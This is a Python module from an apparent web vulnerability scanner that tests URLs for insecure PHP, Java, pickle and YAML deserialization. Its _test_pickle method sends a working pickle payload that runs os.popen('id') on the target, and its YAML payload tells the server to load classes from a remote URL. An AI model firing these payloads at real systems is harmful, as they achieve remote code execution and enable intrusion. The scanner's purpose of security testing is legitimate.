import re, base64, struct, pickle, io
from typing import Optional, Dict
import requests

from aimy.tools.log_utils import get_logger
from aimy.tools.http_client import build_url
from aimy.tools.settings import settings
from aimy.tools.base_detector import BaseDetector

logger = get_logger("deserialization_detector")

DESER_PATTERNS = [
    r'(?i)(java\.io\.Serializable|ObjectInputStream|readObject)',
    r'(?i)(yaml|snakeyaml|Yaml\.load)',
    r'(?i)(pickle|cPickle|__reduce__|__getstate__)',
    r'(?i)(php:\/\/|unserialize|O:\d+:"|s:\d+":)',
    r'(?i)(XMLDecoder|java\.beans\.XMLDecoder)',
    r'(?i)(Jackson|@JacksonInject|@JsonTypeInfo)',
    r'(?i)(FastJson|JSON\.parseObject|@JSONType)',
    r'(?i)(XStream|com\.thoughtworks\.xstream)',
]

PHP_ERROR_PATTERNS = [
    r'PHP Fatal error',
    r'unserialize\(\)',
    r'__PHP_Incomplete_Class',
    r'class name must be a valid object',
]

JAVA_ERROR_PATTERNS = [
    r'java\.io\.(StreamCorruptedException|InvalidClassException)',
    r'com\.sun\.org\.apache\.xml',
    r'javax\.xml\.bind',
    r'org\.apache\.commons',
]

PHP_UNSERIALIZE_PAYLOADS = [
    'O:7:"stdClass":0:{}',
    'a:1:{i:0;s:4:"test";}',
]


def _build_java_serialized() -> bytes:
    buf = io.BytesIO()
    buf.write(b'\xac\xed\x00\x05')
    buf.write(b'\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e')
    buf.write(b'\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01')
    buf.write(b'\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x70\x00\x00\x00\x01')
    return buf.getvalue()


JAVA_SERIALIZED_BYTES = _build_java_serialized()

YAML_PAYLOAD = (
    "!!javax.script.ScriptEngineManager "
    "[!!java.net.URLClassLoader [[!!java.net.URL [\"http://test/\"]]]]"
)


class DeserDetector(BaseDetector):
    """Deserialization detection — inherits baseline from BaseDetector."""

    def _test_post(self, url, param, data, content_type, timeout):
        try:
            body = {param: data} if param else data
            headers = {"Content-Type": content_type}
            r = self.sess.post(url, data=body, headers=headers, timeout=timeout)
            for pat in PHP_ERROR_PATTERNS + JAVA_ERROR_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    if self.is_false_positive(pat, r):
                        continue
                    return {"vector": "post_body", "error_pat": pat[:30]}
            if r.status_code == 500:
                return {"vector": "post_body", "http_500": True}
        except Exception as e:
            logger.debug("post deser: %s", e)
        return None

    def _test_cookie(self, url, param, payload, timeout):
        try:
            r = self.sess.get(url, cookies={param: payload}, timeout=timeout)
            for pat in PHP_ERROR_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    if self.is_false_positive(pat, r):
                        continue
                    return {"vector": "cookie", "error_pat": pat[:30]}
        except Exception as e:
            logger.debug("cookie deser: %s", e)
        return None

    def _test_pickle(self, url, param, timeout):
        class _RCE:
            def __reduce__(self):
                return (eval, ("__import__('os').popen('id').read()",))
        try:
            pickled = base64.b64encode(pickle.dumps(_RCE())).decode()
            headers = {"Content-Type": "application/x-python-serialize"}
            body = {param: pickled} if param else pickled
            r = self.sess.post(url, data=body, headers=headers, timeout=timeout)
            if "uid=" in r.text:
                return {"vector": "pickle_post", "rce_evidence": r.text[:100]}
        except Exception as e:
            logger.debug("pickle deser: %s", e)
        return None

    def _test_java_bytes(self, url, param, timeout):
        try:
            headers = {"Content-Type": "application/x-java-serialized-object"}
            body = {param: JAVA_SERIALIZED_BYTES} if param else JAVA_SERIALIZED_BYTES
            r = self.sess.post(url, data=body, headers=headers, timeout=timeout)
            for pat in JAVA_ERROR_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    if self.is_false_positive(pat, r):
                        continue
                    return {"vector": "java_bytes_post", "error_pat": pat[:30]}
            if r.status_code == 500:
                return {"vector": "java_bytes_post", "http_500": True}
        except Exception as e:
            logger.debug("java bytes deser: %s", e)
        return None

    def _check_impl(self, url: str, param: str = None, **kwargs) -> Dict:
        timeout = kwargs.get("timeout", 10.0)
        result = {"vulnerable": False, "type": None, "evidence": [],
                  "error": None}

        # Phase 1: Source code leak detection
        if url:
            try:
                r = self.sess.get(url, timeout=timeout)
                for pat in DESER_PATTERNS:
                    if re.search(pat, r.text, re.IGNORECASE):
                        if self.is_false_positive(pat, r):
                            logger.debug("deser Phase 1: baseline artifact, skip %s",
                                         pat[:30])
                            continue
                        result["vulnerable"] = True
                        result["type"] = "source_code_leak"
                        result["evidence"].append("deser pattern: %s" % pat[:30])
                        break
            except Exception as e:
                logger.debug("deser scan: %s", e)

        # Phase 2: POST body deserialization
        if param and not result["vulnerable"]:
            for payload in PHP_UNSERIALIZE_PAYLOADS:
                ev = self._test_post(url, param, payload,
                                     "application/x-www-form-urlencoded", timeout)
                if ev:
                    result["vulnerable"] = True
                    result["type"] = "php_unserialize_post"
                    result["evidence"].append("php unserialize via POST: %s" % ev)
                    break

        if param and not result["vulnerable"]:
            ev = self._test_java_bytes(url, param, timeout)
            if ev:
                result["vulnerable"] = True
                result["type"] = "java_serialized_post"
                result["evidence"].append("java deser via POST: %s" % ev)

        if param and not result["vulnerable"]:
            ev = self._test_pickle(url, param, timeout)
            if ev:
                result["vulnerable"] = True
                result["type"] = "pickle_deser"
                result["evidence"].append("python pickle deser: %s" % ev)

        # Phase 3: YAML via POST
        if param and not result["vulnerable"]:
            ev = self._test_post(url, param, YAML_PAYLOAD,
                                 "application/x-yaml", timeout)
            if ev:
                result["vulnerable"] = True
                result["type"] = "yaml_deser"
                result["evidence"].append("yaml deser via POST: %s" % ev)

        # Phase 4: Cookie-based PHP session deserialization
        if param and not result["vulnerable"]:
            for payload in PHP_UNSERIALIZE_PAYLOADS:
                ev = self._test_cookie(url, param, payload, timeout)
                if ev:
                    result["vulnerable"] = True
                    result["type"] = "php_session_deser"
                    result["evidence"].append(
                        "php session deser via cookie: %s" % ev)
                    break

        return result


def check(url: str, param: str = None,
          sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    """Backward-compatible module-level API."""
    return DeserDetector().check(url, param, sess=sess, timeout=timeout)
